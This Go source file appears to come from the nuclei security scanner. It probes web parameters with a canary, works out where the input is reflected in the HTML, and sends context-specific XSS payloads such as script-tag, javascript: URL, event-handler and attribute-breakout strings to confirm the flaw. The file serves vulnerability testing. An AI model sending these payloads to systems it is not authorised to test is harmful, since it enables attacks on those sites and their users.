// Package xss implements an XSS (Cross-Site Scripting) context analyzer
// that intelligently detects the reflection context of user input and
// selects optimal payloads for exploitation.
//
// The analyzer follows a Probe-and-Exploit strategy:
// 1. Probe: Send a canary payload containing XSS-critical characters (<>'"`)
// 2. Analyze: Parse HTML response to identify exact reflection context
// 3. Exploit: Select context-appropriate payload or skip if unexploitable
//
// This approach reduces false positives and minimizes request count by
// targeting only exploitable contexts with precision payloads.
//
// Supported XSS Contexts:
//   - HTML Tag Context (e.g., <div>USER_INPUT</div>)
//   - Attribute Context (quoted/unquoted)
//   - Script Context (inline JS)
//   - Event Handler Context (e.g., onclick="USER_INPUT")
//   - URL Context (href, src attributes)
//   - CSS Context (style attributes)
//
// References:
//   - OWASP XSS Prevention Cheat Sheet
//   - PortSwigger XSS Contexts Guide
package xss

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/pkg/errors"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/nuclei/v3/pkg/fuzz/analyzers"
	"golang.org/x/net/html"
)

// Analyzer implements the XSS context analyzer for nuclei fuzzer
type Analyzer struct{}

var _ analyzers.Analyzer = &Analyzer{}

func init() {
	analyzers.RegisterAnalyzer("xss_context", &Analyzer{})
}

// Name returns the name of the analyzer
func (a *Analyzer) Name() string {
	return "xss_context"
}

// ApplyInitialTransformation applies the transformation to the initial payload.
//
// Supported placeholders:
//   - [XSS_CANARY] => Replaced with a unique canary containing XSS-critical chars
//   - [RANDNUM] => Random number (inherited from base analyzer)
//   - [RANDSTR] => Random string (inherited from base analyzer)
//
// The canary format is: xss_[RANDSTR]_<>'"` which allows us to:
//   - Track reflection in HTML response
//   - Detect active filters on critical characters
//   - Identify exact HTML context via tokenization
func (a *Analyzer) ApplyInitialTransformation(data string, params map[string]interface{}) string {
	// Generate unique canary with XSS-critical characters
	randStr := analyzers.GetRandomInteger()
	canary := fmt.Sprintf("xss_%d_<>'\"``", randStr)
	
	data = strings.ReplaceAll(data, "[XSS_CANARY]", canary)
	
	// Apply standard transformations (RANDNUM, RANDSTR)
	data = analyzers.ApplyPayloadTransformations(data)
	
	return data
}

// Analyze performs XSS context detection and payload optimization
//
// Algorithm:
// 1. Send probe request with canary payload
// 2. Parse HTML response to find canary reflections
// 3. For each reflection, identify XSS context using html.Tokenizer
// 4. Select optimal payload for detected context
// 5. Send exploit request with context-specific payload
// 6. Verify successful XSS exploitation
//
// Returns:
//   - bool: true if XSS vulnerability confirmed
//   - string: detailed reason explaining detection (context, payload, location)
//   - error: any errors during analysis
func (a *Analyzer) Analyze(options *analyzers.Options) (bool, string, error) {
	// Step 1: Send probe request with canary
	gologger.Verbose().Msgf("[%s] Sending probe request to detect XSS context", a.Name())
	
	probeResp, canary, err := a.sendProbeRequest(options)
	if err != nil {
		return false, "", errors.Wrap(err, "failed to send probe request")
	}
	if probeResp == nil {
		return false, "", errors.New("probe request returned nil response")
	}
	defer probeResp.Body.Close()
	
	// Step 2: Read and parse response body (capped at 5MB to prevent OOM)
	bodyBytes, err := io.ReadAll(io.LimitReader(probeResp.Body, 5*1024*1024))
	if err != nil {
		return false, "", errors.Wrap(err, "failed to read probe response body")
	}
	body := string(bodyBytes)
	
	// Step 3: Check if canary is reflected in response
	if !strings.Contains(body, canary) {
		gologger.Verbose().Msgf("[%s] Canary not reflected in response, no XSS possible", a.Name())
		return false, "", nil
	}
	
	gologger.Verbose().Msgf("[%s] Canary reflected! Analyzing HTML context...", a.Name())
	
	// Step 4: Detect XSS contexts
	contexts := a.detectXSSContexts(body, canary)
	if len(contexts) == 0 {
		gologger.Verbose().Msgf("[%s] Canary found but no exploitable XSS context detected", a.Name())
		return false, "", nil
	}
	
	gologger.Info().Msgf("[%s] Detected %d potential XSS context(s)", a.Name(), len(contexts))
	
	// Step 5: Try to exploit each context
	for i, ctx := range contexts {
		gologger.Verbose().Msgf("[%s] Testing context #%d: %s", a.Name(), i+1, ctx.Type)
		
		matched, reason, err := a.exploitContext(options, ctx)
		if err != nil {
			gologger.Warning().Msgf("[%s] Error testing context %s: %v", a.Name(), ctx.Type, err)
			continue
		}
		
		if matched {
			return true, reason, nil
		}
	}
	
	return false, "", nil
}

// sendProbeRequest sends the initial probe request with XSS canary
func (a *Analyzer) sendProbeRequest(options *analyzers.Options) (*http.Response, string, error) {
	gr := options.FuzzGenerated
	
	// Generate unique canary
	randStr := analyzers.GetRandomInteger()
	canary := fmt.Sprintf("xss_%d_<>'\"``", randStr)
	
	// Replace placeholder with canary
	probePayload := strings.ReplaceAll(gr.OriginalPayload, "[XSS_CANARY]", canary)
	probePayload = analyzers.ApplyPayloadTransformations(probePayload)
	
	// Set payload in request component
	if err := gr.Component.SetValue(gr.Key, probePayload); err != nil {
		return nil, "", errors.Wrap(err, "failed to set probe payload in component")
	}
	
	// Rebuild and send request
	rebuilt, err := gr.Component.Rebuild()
	if err != nil {
		return nil, "", errors.Wrap(err, "failed to rebuild probe request")
	}
	
	gologger.Verbose().Msgf("[%s] Probe request: %s", a.Name(), rebuilt.String())
	
	resp, err := options.HttpClient.Do(rebuilt)
	if err != nil {
		return nil, "", errors.Wrap(err, "failed to execute probe request")
	}
	
	return resp, canary, nil
}

// XSSContext represents a detected XSS context in the HTML response
type XSSContext struct {
	Type     string // Context type (e.g., "html_tag", "attribute_quoted")
	Location string // Where in HTML (e.g., "div tag", "a href attribute")
	Payload  string // Optimal payload for this context
	Filter   string // Detected filters (e.g., "angle_brackets_encoded")
}

// detectXSSContexts parses HTML response and identifies XSS contexts
func (a *Analyzer) detectXSSContexts(body, canary string) []XSSContext {
	var contexts []XSSContext
	
	// Parse HTML using Go's html tokenizer
	tokenizer := html.NewTokenizer(strings.NewReader(body))
	
	for {
		tokenType := tokenizer.Next()
		
		switch tokenType {
		case html.ErrorToken:
			// End of document or parse error
			return contexts
			
		case html.TextToken:
			// Text content between tags: <div>USER_INPUT</div>
			text := string(tokenizer.Text())
			if strings.Contains(text, canary) {
				contexts = append(contexts, XSSContext{
					Type:     "html_tag",
					Location: "text node",
					Payload:  "<script>alert(1)</script>",
					Filter:   a.detectFilters(text, canary, true),
				})
			}
			
		case html.StartTagToken, html.SelfClosingTagToken:
			// Tag attributes: <a href="USER_INPUT">
			token := tokenizer.Token()
			
			for _, attr := range token.Attr {
				if !strings.Contains(attr.Val, canary) {
					continue
				}
				
				// Detect attribute context type
				ctx := a.classifyAttributeContext(token.Data, attr.Key, attr.Val, canary)
				contexts = append(contexts, ctx)
			}
			
		case html.CommentToken:
			// HTML comments: <!-- USER_INPUT -->
			comment := string(tokenizer.Text())
			if strings.Contains(comment, canary) {
				contexts = append(contexts, XSSContext{
					Type:     "html_comment",
					Location: "HTML comment",
					Payload:  "--><script>alert(1)</script><!--",
					Filter:   a.detectFilters(comment, canary, true),
				})
			}
		}
	}
}

// classifyAttributeContext determines the specific attribute context type
func (a *Analyzer) classifyAttributeContext(tagName, attrName, attrValue, canary string) XSSContext {
	tagName = strings.ToLower(tagName)
	attrName = strings.ToLower(attrName)
	
	// Event handler attributes (onclick, onerror, etc.)
	// Payload assumes single-quote JS string context (common pattern in event handlers)
	if strings.HasPrefix(attrName, "on") {
		return XSSContext{
			Type:     "event_handler",
			Location: fmt.Sprintf("%s %s attribute", tagName, attrName),
			Payload:  "';alert(1)//",
			Filter:   a.detectFilters(attrValue, canary, false),
		}
	}
	
	// URL attributes (href, src, action, formaction)
	if attrName == "href" || attrName == "src" || attrName == "action" || 
	   attrName == "formaction" || attrName == "data" {
		return XSSContext{
			Type:     "url_attribute",
			Location: fmt.Sprintf("%s %s attribute", tagName, attrName),
			Payload:  "javascript:alert(1)",
			Filter:   a.detectFilters(attrValue, canary, false),
		}
	}
	
	// Style attribute (attribute breakout since CSS-based XSS doesn't work in modern browsers)
	if attrName == "style" {
		return XSSContext{
			Type:     "style_attribute",
			Location: fmt.Sprintf("%s style attribute", tagName),
			Payload:  `";><script>alert(1)</script><div style="`,
			Filter:   a.detectFilters(attrValue, canary, false),
		}
	}
	
	// Generic quoted attribute
	return XSSContext{
		Type:     "attribute_quoted",
		Location: fmt.Sprintf("%s %s attribute", tagName, attrName),
		Payload:  `"><script>alert(1)</script><div x="`,
		Filter:   a.detectFilters(attrValue, canary, false),
	}
}

// detectFilters checks which XSS-critical characters are filtered/encoded
// isRawHTML: true for raw HTML text, false for tokenizer-decoded attribute values
func (a *Analyzer) detectFilters(text, canary string, isRawHTML bool) string {
	var filters []string
	
	// Check if angle brackets are present
	if !strings.Contains(text, "<") && strings.Contains(canary, "<") {
		filters = append(filters, "angle_brackets_filtered")
	}
	
	// Check for HTML entity encoding (only in raw HTML, not decoded attributes)
	// When isRawHTML=false, the tokenizer has already decoded entities, so this check
	// may under-report encoding. This is acceptable since verifyExploitation will reject
	// false positives by checking the final response for unescaped payloads.
	if isRawHTML && (strings.Contains(text, "&lt;") || strings.Contains(text, "&gt;")) {
		filters = append(filters, "html_encoded")
	}
	
	// Check if quotes are escaped
	if strings.Contains(text, "\\'") || strings.Contains(text, "\\\"") {
		filters = append(filters, "quotes_escaped")
	}
	
	if len(filters) == 0 {
		return "none"
	}
	
	return strings.Join(filters, ",")
}

// exploitContext attempts to exploit a detected XSS context
func (a *Analyzer) exploitContext(options *analyzers.Options, ctx XSSContext) (bool, string, error) {
	// Skip if critical filters detected
	// Contexts that require angle brackets: html_tag, attribute_quoted, html_comment, style_attribute
	requiresAngleBrackets := ctx.Type == "html_tag" || ctx.Type == "attribute_quoted" || ctx.Type == "html_comment" || ctx.Type == "style_attribute"
	if (strings.Contains(ctx.Filter, "angle_brackets_filtered") || strings.Contains(ctx.Filter, "html_encoded")) && requiresAngleBrackets {
		gologger.Verbose().Msgf("[%s] Skipping %s context: angle brackets filtered or encoded", a.Name(), ctx.Type)
		return false, "", nil
	}
	
	gr := options.FuzzGenerated
	
	// Build exploit payload
	exploitPayload := strings.ReplaceAll(gr.OriginalPayload, "[XSS_CANARY]", ctx.Payload)
	exploitPayload = analyzers.ApplyPayloadTransformations(exploitPayload)
	
	// Set payload
	if err := gr.Component.SetValue(gr.Key, exploitPayload); err != nil {
		return false, "", errors.Wrap(err, "failed to set exploit payload")
	}
	
	// Rebuild and send
	rebuilt, err := gr.Component.Rebuild()
	if err != nil {
		return false, "", errors.Wrap(err, "failed to rebuild exploit request")
	}
	
	gologger.Verbose().Msgf("[%s] Exploit request: %s", a.Name(), rebuilt.String())
	
	resp, err := options.HttpClient.Do(rebuilt)
	if err != nil {
		return false, "", errors.Wrap(err, "failed to execute exploit request")
	}
	defer resp.Body.Close()
	
	// Read response (capped at 5MB to prevent OOM)
	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 5*1024*1024))
	if err != nil {
		return false, "", errors.Wrap(err, "failed to read exploit response")
	}
	body := string(bodyBytes)
	
	// Verify exploitation
	if a.verifyExploitation(body, ctx) {
		reason := fmt.Sprintf(
			"[xss_context] XSS vulnerability confirmed\n"+
			"  Context: %s\n"+
			"  Location: %s\n"+
			"  Payload: %s\n"+
			"  Filters: %s",
			ctx.Type,
			ctx.Location,
			ctx.Payload,
			ctx.Filter,
		)
		return true, reason, nil
	}
	
	return false, "", nil
}

// verifyExploitation checks if the exploit payload was successfully injected
func (a *Analyzer) verifyExploitation(body string, ctx XSSContext) bool {
	// Look for unencoded script tags or event handlers
	switch ctx.Type {
	case "html_tag":
		return strings.Contains(body, "<script>alert(1)</script>")
		
	case "event_handler":
		// Check for payload in response
		return strings.Contains(body, ctx.Payload)
		
	case "url_attribute":
		return strings.Contains(body, "javascript:alert(1)")
		
	case "attribute_quoted":
		return strings.Contains(body, `"><script>`)
		
	case "html_comment":
		return strings.Contains(body, "--><script>alert(1)</script><!--")
		
	case "style_attribute":
		// Check for attribute breakout
		return strings.Contains(body, `"><script>`)
		
	default:
		// Generic check for unescaped payload
		return strings.Contains(body, ctx.Payload)
	}
}
